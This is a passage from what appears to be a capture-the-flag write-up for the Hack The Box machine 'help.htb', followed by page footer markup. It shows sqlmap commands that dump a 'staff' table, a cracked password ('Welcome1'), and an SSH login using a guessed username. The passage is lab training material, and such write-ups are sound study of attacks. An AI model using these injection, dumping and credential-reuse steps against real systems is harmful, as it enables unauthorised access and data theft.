+<pre tabindex="0"><code>sqlmap -r REQUEST_FILE --batch --level 5 --risk 3 -p param[]
+</code></pre><p>We saw the database name is <code>support</code> and there are a few tables, let&rsquo;s enumerate the <code>staff</code> one since it&rsquo;s the more interesting looking one</p>
+<pre tabindex="0"><code>sqlmap -r REQUEST_FILE --batch --level 5 --risk 3 -p param[] -D support -T staff --dump
+</code></pre><p>we got the password hash cracked from <code>sqlmap</code> too:</p>
+<pre tabindex="0"><code>Welcome1
+</code></pre><p>and leveraging ssh, guessing <code>help</code> from the domain name <code>help.htb</code> as user:</p>
+<pre tabindex="0"><code>ssh help@help.htb
+</code></pre><p>we got in as <code>help</code></p>
+
+                </div>
+            </article>
+
+            <hr />
+
+            <div class="post-info">
+                
+                
+            </div>
+        </main>
+    </div>
+
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.08b680078a3cf9c69e3dd217a5aa52cfddd4a1d850f8cdff127fdd7421a71f8b2b474be69386f67819edace92273916e7230c9054f38107db9dc6730b3530ab5.js" integrity="sha512-CLaAB4o8&#43;caePdIXpapSz93UodhQ&#43;M3/En/ddCGnH4srR0vmk4b2eBntrOkic5FucjDJBU84EH253Gcws1MKtQ=="></script>
+
+
+
+
+    </body>
+</html>
